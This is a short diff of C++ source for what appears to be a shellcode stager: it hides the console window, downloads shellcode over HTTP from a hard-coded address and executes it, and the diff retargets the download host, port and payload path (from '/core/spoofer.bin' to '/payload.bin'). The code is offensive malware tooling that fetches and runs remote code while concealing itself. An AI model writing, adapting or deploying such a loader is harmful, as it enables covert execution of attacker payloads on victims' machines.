@@ -16,7 +16,7 @@ void Execute(Shellcode shellcode);
 void main() {
 	::ShowWindow(::GetConsoleWindow(), SW_HIDE);
 
-	Shellcode shellcode = Download(L"172.16.117.110", 9999);
+	Shellcode shellcode = Download(L"192.168.117.103", 80);
 	Execute(shellcode);
 
 }
@@ -42,7 +42,7 @@ Shellcode Download(LPCWSTR host, INTERNET_PORT port) {
 	HINTERNET request = HttpOpenRequest(
 		connection,
 		L"GET",
-		L"/core/spoofer.bin",
+		L"/payload.bin",
 		NULL,
 		NULL,
 		NULL,
